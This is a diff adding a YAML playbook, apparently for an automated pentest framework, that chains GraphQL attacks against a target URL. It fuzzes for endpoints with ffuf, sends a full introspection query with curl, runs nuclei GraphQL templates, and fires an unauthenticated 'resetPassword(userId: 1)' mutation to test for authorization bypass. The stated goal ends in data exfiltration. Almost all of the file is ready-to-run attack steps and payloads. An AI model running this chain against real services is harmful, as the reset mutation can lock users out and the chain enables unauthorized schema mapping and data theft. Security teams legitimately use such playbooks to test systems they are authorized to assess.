@@ -1,0 +1,69 @@
+name: "GraphQL Introspection & Abuse Chain"
+description: "Discover GraphQL endpoints, run introspection queries to map the schema, identify dangerous fields and mutations, then test for authorization bypass and information disclosure."
+category: web
+attack_vector: "GraphQL introspection → schema mapping → authorization bypass → data exfiltration"
+variables:
+  url:
+    required: true
+    description: "Base target URL (e.g. http://host)"
+cutting_edge: true
+references: ["OWASP GraphQL Top 10", "GraphQL Introspection Attacks"]
+
+steps:
+  - name: "endpoint_discovery"
+    tool: "ffuf_fuzz"
+    description: "Fuzz for GraphQL endpoint paths (/graphql, /v1/graphql, /api, /query, /gql)"
+    args:
+      url: "{{url}}/FUZZ"
+      wordlist: "/usr/share/seclists/Discovery/Web-Content/graphql.txt"
+    expected_output: "Status: 200|graphql"
+    timeout: 300
+    gate: false
+    retries: 1
+
+  - name: "introspection_probe"
+    tool: "curl_request"
+    description: "Send a full introspection query to enumerate the GraphQL schema"
+    args:
+      url: "{{url}}/graphql"
+      method: "POST"
+      headers: 'Content-Type: application/json'
+      data: '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } } } } }"}'
+      follow_redirects: true
+      insecure: true
+    expected_output: "__schema|types|queryType"
+    timeout: 120
+    gate: true
+    retries: 1
+    extracts:
+      - var: "graphql_type"
+        regex: "queryType \\{ name \\} mutationType \\{ name \\} types \\{ ([A-Za-z0-9_]+)"
+
+  - name: "dangerous_field_scan"
+    tool: "nuclei_scan"
+    description: "Run nuclei GraphQL templates to detect introspection exposure and known misconfigurations"
+    args:
+      target: "{{url}}/graphql"
+      templates: "http/misconfiguration/graphql"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
+
+  - name: "mutation_test"
+    tool: "curl_request"
+    description: "Test a destructive/informative mutation (e.g. userInfo, deleteUser, resetPassword) for authorization bypass"
+    args:
+      url: "{{url}}/graphql"
+      method: "POST"
+      headers: 'Content-Type: application/json'
+      data: '{"query":"mutation { resetPassword(userId: 1) { id success } }"}'
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 120
+    gate: false
+    retries: 0
+    extracts:
+      - var: "mutation_response"
+        regex: "\\{[^{}]*success[^{}]*\\}"
